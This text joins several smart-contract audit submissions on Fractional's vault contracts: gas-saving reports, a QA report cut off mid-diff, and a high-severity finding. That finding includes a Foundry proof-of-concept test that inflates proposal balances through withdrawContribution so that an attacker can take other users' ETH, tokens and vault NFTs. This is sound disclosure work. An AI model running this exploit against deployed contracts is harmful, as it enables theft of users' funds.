[VaultFactory.sol#L15](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/VaultFactory.sol#L15) - [Buyout.sol#L29-L33](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L29-L33) - [Migration.sol#L37-L39](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L37-L39)  ## **11. Improved `migrateFractions` logic**  [migrateFractions](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L438-L449) method could be optimized as follows:  ```diff -       (, address proposer, State current, , , ) = IBuyout(buyout).buyoutInfo( +       (, address proposer, State current, , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo(             _vault         );         State required = State.SUCCESS;         if (current != required) revert IBuyout.InvalidState(required, current);         // Reverts if proposer of buyout is not this contract         if (proposer != address(this)) revert NotProposalBuyout(); - -       // Gets the last total supply of fractions for the vault -       (, , , , , uint256 lastTotalSupply) = IBuyout(buyout).buyoutInfo( -           _vault -       ); ```  **There is no need to duplicate the call of `buyoutInfo(_vault)`** 
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L292   # Vulnerability details  ## Impact Steal NFTs from a Vault, and ETH + Fractional tokens from users.  ## Description  The `Migration.sol` module expects users to join a proposal using the `join` function, and leave a proposal using the `leave` function, both functions update fraction and ether balances of the proposal *and* the caller.  The `withdrawContribution` function is meant to be used to retrieve ether and fractions deposited from an unsuccessful migration, but it can be called as well in proposals that have not been commited.  Unfortunately, the `withdrawContribution` function will issue a refund on fraction tokens and ether balances the user sent to a proposal but it will not update the variables `totalEth` and `totalFractions` (as `join` and `leave` do), leading to an inflation of ETH and fractional tokens if the user calls `join`, `withdrawContribution` and `join` again.  Exploiting this inflation bug, an attacker can steal all Ether and fractional tokens sent to a legit proposal by legit users of the community, and redirect them to an evil proposal that will win (because it has over 51% of token supply) and at the same time invalidate the legit proposal due to:  1- Lack of funds (they were stolen).  2- Only 1 LIVE proposal can be running at the same time.  A key element to take note is that only 1 proposal can be `LIVE`, but before a proposal goes `LIVE`, many can be created at the same time, and users can join those that resonate with them, sending their ETH and fractional tokens to support it. The vault will have a big amount of ETH and fractional tokens in these situations.  ## Steps to reproduce An attacker's will exploit the inflation bug as follow:  1- Wait until there's at least 50% of the total supply of fractional tokens in the vault, being stacked into one or several proposals.  2- Create an evil proposal with evil modules and inflate the amount of ETH and fractional tokens in your proposal up to the exact amount of the total ETH and fractional tokens in the vault.  3- Commit your proposal. That will send all ETH and fractional tokens in the vault to your proposal and `start` it.  Now that your proposal has over 51% total supply of fractional tokens in it and a lot of ETH stolen from members of the vault, many creative things can be done, including taking over the Vault's NFTs with an evil module once the proposal goes through.  **NOTE: In the `REJECTION_PERIOD` victims can buy tokens to try to stop the proposal from going through, but the price of every tokens is calculated using the `depositAmount` and `msg.value` (https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L86) both values manipulated by the attacker. **   ## Proof of Concept The proof of concept took 4 hours and 33 mins to be written, as I tried hard to get a clean, and easy to understand and reproduce PoC that illustrates the impact of the attack.  Everything was put inside a function filled with comments at every stage, that can be included within the Unit Tests of the project.  You can read the PoC or include the function in `test/Migration.t.sol` and call `forge test -vvv --match-test testProposalAttack` to execute it.   ```     function testProposalAttack() public {         initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);         (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();         address[] memory modules = new address[](1);         modules[0] = address(mockModule);          // STEP 0         // The attacker waits until a proposal with over 51% joins and a nice amount of ETH is made          // STEP 1         // Alice makes a legit proposal         alice.migrationModule.propose(             vault,             modules,             nftReceiverPlugins,             nftReceiverSelectors,             TOTAL_SUPPLY * 2,             1 ether         );          // STEP 3         // Alice joins his proposal with 50 ETH and 5,000 tokens out of a total supply of 10,000         alice.migrationModule.join{value: 50 ether}(vault, 1, 5000);          // NOTE: In a real world scenario, several members will join Alice's legit proposal with their own ETH and tokens,         // but to make this PoC easier to read, instead of creating several fake accounts,         // let's have just Alice join his own proposal with 50% of token supply.          // STEP 4         // Bob makes an evil proposal, with evil modules to steal the vault's NFTs         bob.migrationModule.propose(             vault,             modules,             nftReceiverPlugins,             nftReceiverSelectors,             TOTAL_SUPPLY,             1 ether         );          // STEP 5         // Bob joins and then withdraws from the proposal in loop, to inflate the ETH of his proposal         // and total locked tokens (thanks to a bug in the `withdrawContribution` function)         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 25);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 24);         bob.migrationModule.withdrawContribution(vault, 2);         bob.migrationModule.join{value: 10 ether}(vault, 2, 101);           // Let's do some accounting...         (,,uint256 totalEth_AliceProposal,,,,,,) = migrationModule.migrationInfo(vault,1);         (,,uint256 totalEth_BobProposal,uint256 _totalFractions,,,,,) = migrationModule.migrationInfo(vault,2);          // Alice proposal has 50 ETH.         assertEq(totalEth_AliceProposal, 50000000000000000000);          // Bob's proposal has 50 ETH.         assertEq(totalEth_BobProposal, 50000000000000000000);          // He only put 10 ETH, but it shows 50 ETH because         // we inflate it by exploiting the bug.          // We can keep inflating it indefinitely to get any ETH         // amount desired (up to the max ETH balance of the smart contract).          // NOTE that the very REAL ETH Balance of the vault is only the 50 ETH (from Alice) + 10 ETH (from Bob) = 60 ETH.          // We'll steal those 50 ETH from alice and all of his fractional tokens, to add them to our proposal now.          // STEP 6         // Bob calls commit to kickoff the buyout process         bool started = bob.migrationModule.commit(vault, 2);         assertTrue(started);          // Final accounting:         // Buyout now has 5,100 Fraction tokens from a total supply of 10,000 (that's 51% of total supply,         // exactly what is required to win a proposal)         assertEq(getFractionBalance(buyout), 5101);          // and 50 ETH from Alice's proposal         assertEq(getETHBalance(buyout), 50 ether);          // Bob started with 100 ether and at this time it has 90 ether, as we only spent 10 ether         assertEq(getETHBalance(bob.addr), 90 ether);          // Bob only sent 101 tokens from his own fraction balance to his evil proposal, the rest were stolen         // from Alice's proposal         assertEq(getFractionBalance(bob.addr), 4899);          // Next steps are straight forward, you can get creative and do many things that would make the PoC         // unnecessarily long          // Alice's proposal will revert if she tries to commit it, as only 1 proposal can be LIVE         // at the same time. Also, there's not enough ETH in the contract to commit his proposal,         // We are using all of his ETH in our own proposal.  ```  ## Tools Used Run `forge test -vvv --match-test testProposalAttack` after preparing the testing environment as explained in https://github.com/code-423n4/2022-07-fractional#prepare-environment   ## Recommended Mitigation Steps Update the `proposal.totalEth` and `proposal.totalFractions` in the `withdrawContribution` function.  
#  [G-01] State variables only set in the constructor should be declared `immutable`:-        1. File: j2022-07-fractional/src/Vault.sol (line 12-17):            `    /// @notice Address of vault owner     address public owner;     /// @notice Merkle root hash of vault permissions     bytes32 public merkleRoot;     /// @notice Initializer value     uint256 public nonce;`        2. File: 2022-07-fractional/src/VaultFactory.sol (line 15):            `address public implementation;`                  3. File: 2022-07-fractional/src/modules/Buyout.sol (line 29-33):            `    address public registry;     /// @notice Address of Supply target contract     address public supply;     /// @notice Address of Transfer target contract     address public transfer;`        4. File: 2022-07-fractional/src/modules/Migration.sol (line 36-41):            `    /// @notice Address of Buyout module contract     address payable public buyout;     /// @notice Address of VaultRegistry contract     address public registry;     /// @notice Counter used to assign IDs to new proposals     uint256 public nextId;`                  5. File: 2022-07-fractional/src/modules/Minter.sol (line 14):            `address public supply;`         6. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 19):            `address public registry;`        7. File: 2022-07-fractional/src/VaultFactory.sol (line 15):            `address public implementation;`               #  [G-02] `x = x + y` is cheaper than `x += y`:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 62):            `totalSupply[_id] -= _amount;`        2. File: 2022-07-fractional/src/FERC1155.sol (line 270):            `balanceOf[_from][_id] -= _amount;`                  3. File: 2022-07-fractional/src/modules/Buyout.sol (line 139):            `buyoutInfo[_vault].ethBalance -= ethAmount;`        4. File: 2022-07-fractional/src/modules/Migration.sol (line 156):            `proposal.totalFractions -= amount;`                  5. File: 2022-07-fractional/src/modules/Migration.sol (line 160):            `proposal.totalEth -= ethAmount;`         6. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 190):            `ceil -= pOf2;`        7. File: 2022-07-fractional/src/FERC1155.sol (line 86):            `totalSupply[_id] += _amount;`         8. File: 2022-07-fractional/src/FERC1155.sol (line 271):            `balanceOf[_to][_id] += _amount;`        9. File: 2022-07-fractional/src/modules/Buyout.sol (line 176):            `buyoutInfo[_vault].ethBalance += msg.value;`                  10. File: 2022-07-fractional/src/modules/Migration.sol (line 123-124):            `proposal.totalEth += msg.value;         userProposalEth[_proposalId][msg.sender] += msg.value;`        11. File: 2022-07-fractional/src/modules/Migration.sol (line 134-135):            `proposal.totalFractions += _amount;         userProposalFractions[_proposalId][msg.sender] += _amount;`                  12. File: 2022-07-fractional/src/modules/Migration.sol (line 497):            `treeLength += IModule(_modules[i]).getLeafNodes().length;`         13. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 147):            `for (uint256 i; i < length - 1; i += 2) {`     #  [G-03] <array>.length should not be looked up in every loop of a for-loop:-        1. File: 2022-07-fractional/src/modules/Buyout.sol (line 454):            `for (uint256 i; i < permissions.length; ) {`        2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 64):            `for (uint256 i = 0; i < _tokens.length; ) {`                  3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 83):            `for (uint256 i = 0; i < _tokens.length; ) {`        4. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  5. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 130):            `for (uint256 i; i < _modules.length; ++i) {`         6. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 132):            `for (uint256 j; j < leaves.length; ++j) {`        7. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         8. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`              #  [G-04] `i++` costs less gas than `++i`, especially when it’s used in for-loops (i--/--i too):-         1. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 130):            `for (uint256 i; i < _modules.length; ++i) {`         3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 132):            `for (uint256 j; j < leaves.length; ++j) {`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`               #  [G-05] Using `private` rather than `public` for constants, saves gas (If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table):-        1. File: 2022-07-fractional/src/FERC1155.sol (line 15-17):            ` string public constant NAME = "FERC1155";     /// @notice Version number of the token contract     string public constant VERSION = "1";`        2. File: 2022-07-fractional/src/modules/Buyout.sol (line 35-37):            `    uint256 public constant PROPOSAL_PERIOD = 2 days;     /// @notice Time length of the rejection period     uint256 public constant REJECTION_PERIOD = 4 days;`                  3. File: 2022-07-fractional/src/modules/Migration.sol (line 43):            `uint256 public constant PROPOSAL_PERIOD = 7 days;`        4. File: 2022-07-fractional/src/utils/SafeSend.sol (line 11-12):            `address payable public constant WETH_ADDRESS =         payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);`                                  #  [G-06] `require()/revert()` strings longer than 32 bytes cost extra gas:-        1. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, "wont generate proof for single leaf");`     #  [G-07] It costs more gas to initialize variables to zero than to let the default of zero be applied:-         1. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 64):            `for (uint256 i = 0; i < _tokens.length; ) {`                  2. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 83):            `for (uint256 i = 0; i < _tokens.length; ) {`        3. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 107):            `for (uint256 i = 0; i < _tokens.length; ++i) {`                  4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`      #  [G-08] `require()` or `revert()` statements that check input arguments should be at the top of the function:-         1. File: 2022-07-fractional/src/FERC1155.sol (line 297):            `require(metadata[_id] != address(0), "NO METADATA");`                  2. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 62):            `require(_data.length > 1, "wont generate root for single leaf");`        3. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, "wont generate proof for single leaf");`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 51):            `for (uint256 i = 0; i < _proof.length; ++i) {`         5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 110):            `for (uint256 i; i < result.length; ++i) {`                  #  [G-09] Use a more recent version of solidity:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 2):            `pragma solidity 0.8.13;`        2. File: 2022-07-fractional/src/Vault.sol (line 2):            `pragma solidity 0.8.13;`                  3. File: 2022-07-fractional/src/VaultFactory.sol (line 2):            `pragma solidity 0.8.13;`        4. File: 2022-07-fractional/src/VaultRegistry.sol (line 2):            `pragma solidity 0.8.13;`                  5. File: 2022-07-fractional/src/constants/Memory.sol (line 2):            `pragma solidity 0.8.13;`        6. File: 2022-07-fractional/src/constants/Permit.sol (line 2):            `pragma solidity 0.8.13;`        7. File: 2022-07-fractional/src/constants/Supply.sol(line 2):            `pragma solidity 0.8.13;`         8. File: 2022-07-fractional/src/constants/Transfer.sol (line 2):            `pragma solidity 0.8.13;`        9. File: 2022-07-fractional/src/interfaces/IBaseVault.sol (line 2):            `pragma solidity 0.8.13;`                  10. File: 2022-07-fractional/src/interfaces/IBuyout.sol (line 2):            `pragma solidity 0.8.13;`        11. File: 2022-07-fractional/src/interfaces/IERC1155.sol (line 2):            `pragma solidity 0.8.13;`                  12. File: 2022-07-fractional/src/interfaces/IERC20.sol(line 2):            `pragma solidity 0.8.13;`         13. File: 2022-07-fractional/src/interfaces/IERC721.sol (line 2):            `pragma solidity 0.8.13;`        14. File: 2022-07-fractional/src/interfaces/IFERC1155.sol (line 2):            `pragma solidity 0.8.13;`        15. File: 2022-07-fractional/src/interfaces/IMigration.sol (line 2):            `pragma solidity 0.8.13;`                  16. File: 2022-07-fractional/src/interfaces/IMinter.sol (line 2):            `pragma solidity 0.8.13;`        17. File: 2022-07-fractional/src/interfaces/IModule.sol (line 2):            `pragma solidity 0.8.13;`                  18. File: 2022-07-fractional/src/interfaces/INFTReceiver.sol (line 2):            `pragma solidity 0.8.13;`        19. File: 2022-07-fractional/src/interfaces/IProtoform.sol (line 2):            `pragma solidity 0.8.13;`        20. File: 2022-07-fractional/src/interfaces/ISupply.sol (line 2):            `pragma solidity 0.8.13;`         21. File: 2022-07-fractional/src/interfaces/ITransfer.sol (line 2):            `pragma solidity 0.8.13;`        22. File: 2022-07-fractional/src/interfaces/IVault.sol (line 2):            `pragma solidity 0.8.13;`                  23. File: 2022-07-fractional/src/interfaces/IVaultFactory.sol (line 2):            `pragma solidity 0.8.13;`        24. File: 2022-07-fractional/src/interfaces/IVaultRegistry.sol (line 2):            `pragma solidity 0.8.13;`                  25. File: 2022-07-fractional/src/modules/Buyout.sol (line 2):            `pragma solidity 0.8.13;`        26. File: 2022-07-fractional/src/modules/Migration.sol (line 2):            `pragma solidity 0.8.13;`        27. File: 2022-07-fractional/src/modules/Minter.sol (line 2):            `pragma solidity 0.8.13;`        28. File: 2022-07-fractional/src/modules/protoforms/BaseVault.sol (line 2):            `pragma solidity 0.8.13;`                  29. File: 2022-07-fractional/src/references/SupplyReference.sol (line 2):            `pragma solidity 0.8.13;`        30. File: 2022-07-fractional/src/references/TransferReference.sol (line 2):            `pragma solidity 0.8.13;`                  31. File: 2022-07-fractional/src/targets/Supply.sol (line 2):            `pragma solidity 0.8.13;`        32. File: 2022-07-fractional/src/targets/Transfer.sol (line 2):            `pragma solidity 0.8.13;`        33. 2022-07-fractional/src/utils/MerkleBase.sol (line 2):            `pragma solidity 0.8.13;`         34. File: 2022-07-fractional/src/utils/Metadata.sol (line 2):            `pragma solidity 0.8.13;`        35. File: 2022-07-fractional/src/utils/Multicall.sol (line 2):            `pragma solidity 0.8.13;`                  36. File: 2022-07-fractional/src/utils/SafeSend.sol (line 2):            `pragma solidity 0.8.13;`        36. File: 2022-07-fractional/src/utils/SelfPermit.sol (line 2):            `pragma solidity 0.8.13;`                 #  [G-10] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate {Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot} :-        1. File: 2022-07-fractional/src/FERC1155.sol (line 25-34):            `    /// @notice Mapping of metadata contracts for token ID types => metadata address     mapping(uint256 => address) public metadata;     /// @notice Mapping to track account nonces for metadata txs owner => nonces     mapping(address => uint256) public nonces;     /// @notice Mapping to track total supply for token ID types => totalSupply     mapping(uint256 => uint256) public totalSupply;     /// @notice Mapping to track royalty receivers for token ID types => royaltyAddress     mapping(uint256 => address) private royaltyAddress;     /// @notice Mapping to track the royalty percent for token ID types => royaltyPercent     mapping(uint256 => uint256) private royaltyPercent;`    #  [G-11] Empty blocks should be removed or emit something:-        1. File: 2022-07-fractional/src/Vault.sol (line 32):            `preceive() external payable {}`        2. File: 2022-07-fractional/src/modules/Buyout.sol (line 53):            `receive() external payable {}`                  3. File: 2022-07-fractional/src/modules/Migration.sol (line 63):            `receive() external payable {}`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 8):            `constructor() {}`              #  [G-12] Use custom errors rather than revert()/require() strings to save deployment gas:-        1. File: 2022-07-fractional/src/FERC1155.sol (line 263):            `require(             msg.sender == _from ||                 isApprovedForAll[_from][msg.sender] ||                 isApproved[_from][msg.sender][_id],             "NOT_AUTHORIZED"         );`        2. File: 2022-07-fractional/src/FERC1155.sol (line 275):            `require(             _to.code.length == 0                 ? _to != address(0)                 : INFTReceiver(_to).onERC1155Received(                     msg.sender,                     _from,                     _id,                     _amount,                     _data                 ) == INFTReceiver.onERC1155Received.selector,             "UNSAFE_RECIPIENT"         );`                  3. File: 2022-07-fractional/src/FERC1155.sol (line 297):            `require(metadata[_id] != address(0), "NO METADATA");`        4. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 62):            `require(_data.length > 1, "wont generate root for single leaf");`                            5. File: 2022-07-fractional/src/utils/MerkleBase.sol (line 78):            `require(_data.length > 1, "wont generate proof for single leaf");`                                                    #  [G-13] Functions guaranteed to revert when called by normal users can be marked payable (If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided.):-        1. File: 2022-07-fractional/src/FERC1155.sol (line 37-50):            `   modifier onlyController() {         address controller_ = controller();         if (msg.sender != controller_)             revert InvalidSender(controller_, msg.sender);         _;     }      /// @notice Modifier for restricting function calls to the VaultRegistry     modifier onlyRegistry() {         address vaultRegistry = VAULT_REGISTRY();         if (msg.sender != vaultRegistry)             revert InvalidSender(vaultRegistry, msg.sender);         _;     }`        2. File: 2022-07-fractional/src/FERC1155.sol (line 56-63):            `function burn(         address _from,         uint256 _id,         uint256 _amount     ) external onlyRegistry {         _burn(_from, _id, _amount);         totalSupply[_id] -= _amount;     }`                  3. File: 2022-07-fractional/src/FERC1155.sol (line 79-87):            `function mint(         address _to,         uint256 _id,         uint256 _amount,         bytes memory _data     ) external onlyRegistry {         _mint(_to, _id, _amount, _data);         totalSupply[_id] += _amount;     }`        4. File: 2022-07-fractional/src/FERC1155.sol (line 198-232):            `function setContractURI(string calldata _uri) external onlyController {         contractURI = _uri;     }      /// @notice Sets the token metadata contract     /// @param _metadata Address for metadata contract     /// @param _id Token ID to set the metadata for     function setMetadata(address _metadata, uint256 _id)         external         onlyController     {         metadata[_id] = _metadata;         emit SetMetadata(_metadata, _id);     }      /// @notice Sets the token royalties     /// @param _id Token ID royalties are being updated for     /// @param _receiver Address to receive royalties     /// @param _percentage Percentage of royalties on secondary sales     function setRoyalties(         uint256 _id,         address _receiver,         uint256 _percentage     ) external onlyController {         royaltyAddress[_id] = _receiver;         royaltyPercent[_id] = _percentage;         emit SetRoyalty(_receiver, _id, _percentage);     }      /// @notice Updates the controller address for the FERC1155 token contract     /// @param _newController Address of new controlling entity     function transferController(address _newController)         external         onlyController     {`                      
# QA Report  ## Table of Contents  - [summary](#summary)  ### Low - [hash collision with abi.encodePacked](#hash-collision-with-abi.encodepacked) - [Native `transfer` should be avoided](#native-transfer-should-be-avoided) - [Return value of ERC20.transferFrom unchecked](#return-value-of-erc20.transferfrom-unchecked) - [Setters and constructors should check the input value](#setters-and-constructors-should-check-the-input-value) - [Unused `receive()` functions](#`unused-receive-functions`)  ### Non-critical - [Constants instead of magic numbers](#constants-instead-of-magic-numbers) - [Events indexing](#events-indexing) - [Event should be emitted in setters](#event-should-be-emitted-in-setters) - [Public functions can be external](#public-functions-can-be-external) - [Redundant cast](#redundant-cast) - [Signature malleability](#signature-malleability) - [TODOs](#todos) - [Visibility should be explicit](#visibility-should-be-explicit)      # summary  > Few vulnerabilities were found examining the contracts. The main concerns are with:  # Low issues  # hash collision with abi.encodePacked  ## IMPACT  strings and bytes are encoded with padding when using `abi.encodePacked`. This can lead to [hash collision](https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#non-standard-packed-mode) when passing the result to `keccak256`  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/FERC1155.sol   ```cpp 394:             keccak256( 395:                 abi.encodePacked("\x19\x01", _domainSeparator, _structHash) 396:             ); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `abi.encode()` instead.   # Native `transfer` should be avoided  ## IMPACT   In `Migration`, the `.transfer()` method is used to transfer ETH.   The `transfer()` call requires that the recipient has a payable callback, only provides 2300 gas for its operation. This means the following cases can cause the transfer to fail:  - The contract does not have a payable callback - The contract’s payable callback spends more than 2300 gas (which is only enough to emit something) - The contract is called through a proxy which itself uses up the 2300 gas  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/modules/Migration.sol  ```cpp 172:         payable(msg.sender).transfer(ethAmount); 325:         payable(msg.sender).transfer(ethAmount); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `.call()` to send ETH instead.  # Return value of ERC20.transferFrom unchecked  ## IMPACT   Some ERC20 implementations do not revert upon a fail `transfer/transferFrom` call, but return `false` instead. Not checking the return values of these calls can hence lead to silent failures of tokens transfers.  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/modules/protoforms/BaseVault.sol  ```cpp 65:             IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Check the return value of these calls to ensure they are not `0`  # Setters and constructors should check the input value  ## PROBLEM  Setters and constructors should check the input value for addresses - ie revert if `address(0)` is assigned to `address` variables.    ## SEVERITY  Low     ## PROOF OF CONCEPT  Instances include:   ### src/modules/protoforms/BaseVault.sol  ```cpp 24:     constructor(address _registry, address _supply) Minter(_supply) { 25:         registry = _registry; 26:     } ```  ### src/modules/Buyout.sol  ```cpp 42:     constructor( 43:         address _registry, 44:         address _supply, 45:         address _transfer 46:     ) { 47:         registry = _registry; 48:         supply = _supply; 49:         transfer = _transfer; 50:     } ```  ### src/modules/Migration.sol  ```cpp 58:         buyout = payable(_buyout); 59:         registry = _registry; ```  ### src/modules/Minter.sol  ```cpp 17:     constructor(address _supply) { 18:         supply = _supply; 19:     } ```  ### src/references/SupplyReference.sol  ```cpp 15:     constructor(address _registry) { 16:         registry = _registry; 17:     } ```  ### src/targets/Supply.sol  ```cpp 16:     constructor(address _registry) { 17:         registry = _registry; 18:     } ```  ## TOOLS USED  Manual Analysis    ## MITIGATION  Add non-zero checks   # Unused `receive()` functions  ## IMPACT   `Vault` and `Buyout` have an empty `receive()` function, but do not have any withdrawal function. Any ETH mistakenly sent to these contracts with empty `msg.data` would be locked.    ## SEVERITY  Low    ## PROOF OF CONCEPT  2 instances include:   ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L32 ```cpp 32:     receive() external payable {} ```  ### src/modules/Buyout.sol#L53  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53 ```cpp 53:     receive() external payable {} ```   ## TOOLS USED  Manual Analysis    ## MITIGATION  Removes these functions or implement the appropriate logic in these empty blocks  # Non-critical issues  # Constants instead of magic numbers  ## PROBLEM  It is best practice to use constant variables rather than literal values (100, 1000, etc) to make the code easier to understand and maintain.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  7 instances include:  ### src/FERC1155.sol  ```cpp 247:         royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; ```  ### src/modules/Buyout.sol  ```cpp 86:         uint256 buyoutPrice = (msg.value * 100) / 87:             (100 - ((depositAmount * 100) / totalSupply)); ```  ```cpp 208:         if ( 209:             (tokenBalance * 1000) / 210:                 IVaultRegistry(registry).totalSupply(_vault) > 211:             500 212:         ) ```  ### src/modules/Migration.sol  ```cpp 198:         uint256 currentPrice = _calculateTotal( 199:             100, 200:             IVaultRegistry(registry).totalSupply(_vault), 201:             proposal.totalEth, 202:             proposal.totalFractions 203:         ) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Define constant variables for the literal values aforementioned.   # Events indexing  ## PROBLEM  Events should use the maximum amount of indexed fields: up to three parameters. This makes it easier to filter for specific values in front-ends.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:   ### src/interfaces/IBuyout.sol  ```cpp 55: event Start( 56:         address indexed _vault, 57:         address indexed _proposer, 58:         uint256 _startTime, 59:         uint256 _buyoutPrice, 60:         uint256 _fractionPrice 61:     );  65:     event SellFractions(address indexed _seller, uint256 _amount);  69:     event BuyFractions(address indexed _buyer, uint256 _amount);  74:     event End(address _vault, State _state, address indexed _proposer);  79:     event Cash(address _vault, address indexed _casher, uint256 _amount);  83:     event Redeem(address _vault, address indexed _redeemer); ```  ### src/interfaces/IFERC1155.sol  ```cpp 21:     event SetMetadata(address indexed _metadata, uint256 _id); ```  ```cpp 26:     event SetRoyalty( 27:         address indexed _receiver, 28:         uint256 _id, 29:         uint256 _percentage 30:     ); ```  ```cpp 36:     event SingleApproval( 37:         address indexed _owner, 38:         address indexed _operator, 39:         uint256 _id, 40:         bool _approved 41:     ); ```  ```cpp 61:     event FractionsMigrated( 62:         address indexed _oldVault, 63:         address indexed _newVault, 64:         uint256 _proposalId, 65:         uint256 _amount 66:     ); ```  ```cpp 74:     event VaultMigrated( 75:         address indexed _oldVault, 76:         address indexed _newVault, 77:         uint256 _proposalId, 78:         address[] _modules, 79:         address[] _plugins, 80:         bytes4[] _selectors 81:     ); ```  ### src/interfaces/IVault.sol  ```cpp 25:     event Execute(address indexed _target, bytes _data, bytes _response); ```  ```cpp 33:     event TransferOwnership( 34:         address indexed _oldOwner, 35:         address indexed _newOwner 36:     ); ```  ### src/interfaces/IVaultRegistry.sol  ```cpp 33:     event VaultDeployed( 34:         address indexed _vault, 35:         address indexed _token, 36:         uint256 _id 37:     ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add indexed fields to these events so that they have the maximum number of indexed fields possible.   # Event should be emitted in setters  ## PROBLEM  Setters should emit an event so that Dapps can detect important changes to storage   ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### src/FERC1155.sol  ```cpp 198:     function setContractURI(string calldata _uri) external onlyController ```  ### src/Vault.sol  ```cpp 86: function setMerkleRoot(bytes32 _rootHash) external  ```  ## TOOLS USED  Manual Analysis    ## MITIGATION  Emit an event in all setters.   # Public functions can be external  ## PROBLEM  It is good practice to mark functions as `external` instead of `public` if they are not called by the contract where they are defined.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### src/utils/MerkleBase.sol  ```cpp 43:     function verifyProof( 44:         bytes32 _root, 45:         bytes32[] memory _proof, 46:         bytes32 _valueToProve 47:     ) public pure returns (bool) ``` ```cpp 61:     function getRoot(bytes32[] memory _data) public pure returns (bytes32) ``` ```cpp 73:     function getProof(bytes32[] memory _data, uint256 _node) 74:         public 75:         pure 76:         returns (bytes32[] memory) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Declare these functions as `external` instead of `public`   # Redundant cast  ## PROBLEM  In `Migration.commit()`, `buyout` is cast to type `address`, which is redundant as it is already of type `address`.  ### src/modules/Migration.sol  ```cpp 208:             IFERC1155(token).setApprovalFor(address(buyout), id, true); ```    ## SEVERITY  Non-Critical   ## TOOLS USED  Manual Analysis    ## MITIGATION  ```diff -208:             